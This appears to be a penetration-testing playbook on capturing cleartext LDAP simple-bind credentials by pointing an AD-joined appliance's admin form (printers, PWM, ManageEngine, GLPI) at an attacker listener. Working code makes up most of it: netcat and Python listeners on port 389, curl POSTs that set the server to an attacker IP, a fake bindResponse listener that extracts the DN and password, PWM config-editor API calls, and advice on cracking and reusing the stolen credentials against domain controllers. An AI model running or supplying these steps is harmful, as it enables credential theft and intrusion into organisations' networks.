# LDAP Simple-Bind Capture via Misconfigured Admin Form

## When this applies

- AD-joined appliance — printer, copier, MFP/scan-to-folder panel, IP camera, NAS web UI, monitoring agent, PWM/ManageEngine ADManager/GLPI — exposes a "set LDAP server IP" or similar field in admin UI.
- The appliance authenticates via cleartext LDAP simple-bind to whatever IP you specify.
- Goal: redirect the bind to your listener and capture the cleartext bind DN + password.

## Technique

Point the appliance's LDAP server config at your VPN IP, listen on TCP 389, and parse the LDAPMessage SimpleBind PDU to extract DN + password. No DNS poisoning required — the appliance does the connecting.

## Steps

```bash
# 1. Bind a plain TCP listener on attacker host. macOS/BSD allow non-root :389.
#    Linux requires CAP_NET_BIND_SERVICE or sudo.
nc -lvk 389 | tee ldap_capture.bin
# Or for the structured-bind packet (slower but human-readable):
sudo python3 -c "import socket; s=socket.socket(); s.bind(('0.0.0.0',389)); s.listen(); c,_=s.accept(); print(c.recv(4096))"

# 2. Inspect the form: usually exactly one named field controls the server target.
#    Common names: ip, server, ldap_server, ldap_host, host, address.
curl -s http://target/settings.php | grep -E 'name="(ip|server|ldap_(server|host)|host|address)"'

# 3. POST the attacker IP. The appliance will simple-bind on the next "Test" or
#    save action — sometimes immediately after the POST.
curl -X POST -d 'ip=<ATTACKER_VPN_IP>' http://target/settings.php

# 4. The bind LDAPMessage is ASN.1 BER but the bind DN and password are visible
#    as cleartext bytes in the dump. For printer/MFP panels the DN is typically
#    `CN=svc-printer,OU=Service Accounts,...` and the password is plain ASCII.
xxd ldap_capture.bin | less
```

## Robust LDAP capture listener — for clients that need a real bindResponse

`nc -lvk 389` is fine for printers/copiers (one-shot bind, then disconnect). But PWM, ManageEngine ADManager, GLPI, and most Java-based "Test LDAP connection" features close the connection if no `LDAPMessage:bindResponse:success` comes back, and may retry with a *second* bind (current vs new password) or upgrade to SASL. Use a 15-line Python listener that parses the SimpleBind and replies with a fake `bindResponse:success` — keeps the client engaged through retries:

```python
import socket
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 389)); s.listen()
while True:
    c, a = s.accept()
    data = c.recv(4096)
    try:
        # SimpleBind: LDAPMessage envelope contains INTEGER version=3 (02 01 03),
        # then OCTET STRING dn, then password (context-tag 0x80 simple).
        i = data.index(b'\x02\x01\x03') + 3
        dn_len = data[i+1]; dn = data[i+2:i+2+dn_len].decode(errors='replace')
        j = i + 2 + dn_len; pw_len = data[j+1]
        pw = data[j+2:j+2+pw_len].decode(errors='replace')
        print(f'[+] BIND from {a}: DN={dn!r} PW={pw!r}')
    except Exception:
        print(f'[?] non-bind / unparseable from {a}: {data[:80].hex()}')
    # Fake bindResponse:success (LDAPMessage id=1, op=0x61, resultCode=0)
    c.sendall(bytes.fromhex('300c020101610702010004000400'))
    c.close()
```

- Run with `sudo` on Linux (port 389 < 1024); macOS/BSD allow non-root.
- For LDAPS clients (TLS-only): wrap the socket with `ssl.wrap_socket(server_side=True, certfile=...)` using a self-signed cert. Most enterprise apps accept it because they don't pin the CA.

## PWM/LDAP Self-Service Password Manager Specific

PWM ships TWO separate authentication endpoints — confusing them costs hours:

- `/pwm/private/login`          — END-USER login (LDAP-bind to AD, password reset workflow). NOT exploitable directly; needs valid AD creds.
- `/pwm/private/config/login`   — CONFIG-MANAGER login (single password from `PwmConfiguration.xml`). THIS is the one that matters.

The config-manager password is often:
- "OPEN" mode: `PwmConfiguration` in build/dev mode — no password required at all
- cleartext from a leaked Ansible vault / git repo / config backup share
- bcrypt `$2y$04$...` hash in PwmConfiguration.xml (low cost factor = fast crack)

Always try `/pwm/private/config/login` FIRST; user-side login is a dead end without prior creds.

Config editor API: form-encoded POST to `/pwm/private/config/editor`:
- `processAction` + `key` + `profile` as form data; value as JSON body via URL params
- writeSetting: `POST /pwm/private/config/editor?processAction=writeSetting&key=ldap.serverUrls&profile=default&pwmFormID=...`
- Body (JSON): `["ldap://ATTACKER_IP:389"]`

Trigger LDAP connection: `ldapHealthCheck` processAction. Capture cleartext LDAP bind credentials (DN + password) with the Robust LDAP capture listener above — PWM closes the connection if no bindResponse:success comes back, so plain `nc -lvk 389` is not enough; use the Python listener.

## Verifying success

- The listener prints `[+] BIND from <IP>: DN=<bind DN> PW=<cleartext password>`.
- Recovered creds authenticate via `nxc smb DC -u <DN_user> -p <password>`.

## Common pitfalls

- Always try this BEFORE Responder/relay infrastructure on AD-joined appliances. It's faster, leaves no DNS artifacts, and works even when LLMNR/NBNS are disabled.
- If the form rejects external IPs (input validation), check for an admin "test connection" button that POSTs the same field and may have looser validation.
- Other config-form variants worth trying the same trick on: SMTP server, syslog server, Active Directory join (some appliances simple-bind during the join), backup destination (SMB credentials over a fake share).

## Tools

- nc (basic capture)
- Python socket + ASN.1 BER (full bindResponse listener)
- ssl module (LDAPS variant)
